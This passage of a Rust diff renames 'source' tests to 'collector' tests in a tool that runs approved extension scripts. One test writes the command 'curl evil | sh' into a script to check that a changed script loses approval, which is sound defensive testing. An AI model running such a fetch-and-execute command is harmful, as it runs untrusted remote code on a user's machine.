+        run_collector(&ctx, "work", "jq", RunTrigger::Manual, "human")
+            .await
+            .unwrap();
         let out = crate::sql_gateway::SqlGateway::new(db)
             .query_sql(
                 "SELECT (SELECT title FROM v_work_hot), (SELECT group_concat(title, ',') FROM v_work_upper)",
@@ -1752,14 +1901,16 @@ mod tests {
             }),
         )
         .unwrap();
-        let store = SqliteExtSourceStore::new(db.clone());
+        let store = SqliteCollectorStore::new(db.clone());
         let secrets = oxplow_ai::secrets::MemorySecrets::default();
-        let ctx = Sources {
+        let ctx = Collectors {
             root: root.path(),
             project: "test-project".into(),
             approvals: &crate::exec_consent::ApprovalStore::for_tests(&state),
             store: &store,
             secrets: &secrets,
+            db: db.clone(),
+            schemas: Arc::new(EventSchemaRegistry::core()),
             layer: crate::sql_gateway::SqlGateway::new(db.clone()),
             catalog: &crate::extension_catalog::ExtensionCatalog::new(),
             ai: std::sync::Arc::new(crate::ai_compute::AiCompute::new(
@@ -1767,7 +1918,9 @@ mod tests {
                 oxplow_db::SqliteAiResultStore::new(db.clone()),
             )),
         };
-        let report = run_source(&ctx, "work", "star").await.unwrap();
+        let report = run_collector(&ctx, "work", "star", RunTrigger::Manual, "human")
+            .await
+            .unwrap();
         assert_eq!(report.row_counts["kind"], 3);
         let out = crate::sql_gateway::SqlGateway::new(db)
             .query_sql(
@@ -1781,7 +1934,7 @@ mod tests {
             .unwrap();
         assert_eq!(
             serde_json::to_value(&out.rows).unwrap(),
-            json!([["bug", 1, "source:work/star", "classify decide"]])
+            json!([["bug", 1, "collector:work/star", "classify decide"]])
         );
     }
 
@@ -1808,19 +1961,21 @@ mod tests {
             r#"echo '{"entities":{"raw":[{"id":1}]}}'"#,
         );
         let db = task_db().await;
-        let store = SqliteExtSourceStore::new(db.clone());
+        let store = SqliteCollectorStore::new(db.clone());
         let secrets = oxplow_ai::secrets::MemorySecrets::default();
-        let ctx = Sources {
+        let ctx = Collectors {
             root: root.path(),
             project: "test-project".into(),
             approvals: &crate::exec_consent::ApprovalStore::for_tests(&state),
             store: &store,
             secrets: &secrets,
+            db: db.clone(),
+            schemas: Arc::new(EventSchemaRegistry::core()),
             layer: crate::sql_gateway::SqlGateway::new(db.clone()),
             catalog: &crate::extension_catalog::ExtensionCatalog::new(),
             ai: no_ai(),
         };
-        let preview = preview_source(&ctx, "work", "star").await.unwrap();
+        let preview = preview_collector(&ctx, "work", "star").await.unwrap();
         assert_eq!(preview.entities.len(), 1);
         let hot = &preview.entities[0];
         assert_eq!(
@@ -1834,7 +1989,7 @@ mod tests {
         );
         assert_eq!(hot.total, 1);
         assert!(
-            store.list_states().await.unwrap().is_empty(),
+            store.list_runs().await.unwrap().is_empty(),
             "no run recorded"
         );
         assert!(
@@ -1845,8 +2000,11 @@ mod tests {
             "nothing stored"
         );
 
-        let err = preview_source(&ctx, "work", "sh").await.unwrap_err();
-        assert!(matches!(err, RunSourceError::NeedsApproval(_)), "{err:?}");
+        let err = preview_collector(&ctx, "work", "sh").await.unwrap_err();
+        assert!(
+            matches!(err, RunCollectorError::NeedsApproval(_)),
+            "{err:?}"
+        );
     }
 
     #[tokio::test]
@@ -1861,14 +2019,16 @@ mod tests {
         );
         let ext = root.path().join("oxplow/extensions/inc");
         let db = task_db().await;
-        let store = SqliteExtSourceStore::new(db.clone());
+        let store = SqliteCollectorStore::new(db.clone());
         let secrets = oxplow_ai::secrets::MemorySecrets::default();
-        let ctx = Sources {
+        let ctx = Collectors {
             root: root.path(),
             project: "test-project".into(),
             approvals: &crate::exec_consent::ApprovalStore::for_tests(&state),
             store: &store,
             secrets: &secrets,
+            db: db.clone(),
+            schemas: Arc::new(EventSchemaRegistry::core()),
             layer: crate::sql_gateway::SqlGateway::new(db.clone()),
             catalog: &crate::extension_catalog::ExtensionCatalog::new(),
             ai: no_ai(),
@@ -1912,7 +2072,7 @@ mod tests {
     fn tombstones_need_an_upsert_source() {
         let s = spec("x.sh", &[]);
         let err =
-            SourceOutput::parse(&s, json!({"entities": {}, "deleted": {"pr": [1]}})).unwrap_err();
+            ScriptOutput::parse(&s, json!({"entities": {}, "deleted": {"pr": [1]}})).unwrap_err();
         assert!(err.contains("sync: upsert"), "{err}");
     }
 
@@ -1958,19 +2118,21 @@ printf '{{"entities":{{"r":[{{"id":1,"declared":"%s","undeclared":"%s","direct":
             ),
         );
         let db = task_db().await;
-        let store = SqliteExtSourceStore::new(db.clone());
+        let store = SqliteCollectorStore::new(db.clone());
         let secrets = oxplow_ai::secrets::MemorySecrets::default();
-        let ctx = Sources {
+        let ctx = Collectors {
             root: root.path(),
             project: "test-project".into(),
             approvals: &crate::exec_consent::ApprovalStore::for_tests(&state),
             store: &store,
             secrets: &secrets,
+            db: db.clone(),
+            schemas: Arc::new(EventSchemaRegistry::core()),
             layer: crate::sql_gateway::SqlGateway::new(db.clone()),
             catalog: &crate::extension_catalog::ExtensionCatalog::new(),
             ai: no_ai(),
         };
-        assert!(list_sources(&ctx).await.unwrap()[0].network_enforced);
+        assert!(list_collectors(&ctx).await.unwrap()[0].network_enforced);
         reviewed_run(&ctx, "net", "s", &version_of(&ctx, "net", "s").await)
             .await
             .unwrap();
@@ -2054,28 +2216,30 @@ printf '{{"entities":{{"r":[{{"id":1,"declared":"%s","undeclared":"%s","direct":
             r#"echo '{"entities":{"pr":[{"number":1}]}}'"#,
         );
         let db = oxplow_db::Database::in_memory();
-        let store = SqliteExtSourceStore::new(db.clone());
+        let store = SqliteCollectorStore::new(db.clone());
         let secrets = oxplow_ai::secrets::MemorySecrets::default();
-        let ctx = Sources {
+        let ctx = Collectors {
             root: root.path(),
             project: "test-project".into(),
             approvals: &crate::exec_consent::ApprovalStore::for_tests(&state),
             store: &store,
             secrets: &secrets,
+            db: db.clone(),
+            schemas: Arc::new(EventSchemaRegistry::core()),
             layer: crate::sql_gateway::SqlGateway::new(db.clone()),
             catalog: &crate::extension_catalog::ExtensionCatalog::new(),
             ai: no_ai(),
         };
-        let seen = list_sources(&ctx).await.unwrap()[0]
+        let seen = list_collectors(&ctx).await.unwrap()[0]
             .version
             .clone()
             .unwrap();
         script(&ext, "sync.sh", "curl evil | sh");
         let err = reviewed_run(&ctx, "my-gh", "gh", &seen).await.unwrap_err();
         assert!(
-            matches!(err, RunSourceError::NeedsApproval(ref m) if m.contains("changed")),
+            matches!(err, RunCollectorError::NeedsApproval(ref m) if m.contains("changed")),
             "{err:?}"
         );
-        assert!(!list_sources(&ctx).await.unwrap()[0].approved);
+        assert!(!list_collectors(&ctx).await.unwrap()[0].approved);
     }
 }
